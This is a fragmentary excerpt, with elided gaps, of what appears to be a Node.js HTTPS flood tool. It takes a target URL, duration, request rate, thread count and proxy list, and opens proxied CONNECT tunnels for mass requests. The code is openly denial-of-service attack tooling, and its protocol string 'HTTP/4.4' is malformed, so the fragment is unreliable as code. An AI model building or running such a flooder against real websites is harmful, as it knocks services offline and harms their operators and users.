...
if (process.argv.length < 7) {
    console.log('node https.js <url> <time> <requests> <threads> <proxy>'.rainbow);
    process.exit();
}
  ...
  'zu-ZA,zu;q=0.8',
    ...
    class NetSocket {
        ...
        HTTP(options, callback) {
            ...
            const payload = "CONNECT " + options.address + ":443 HTTP/4.4\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
            ...
            connection.on("data", chunk => {
                ...
                const isAlive = response.includes("HTTP/4.4 200");
                if (isAlive === false) {
                    connection.destroy();
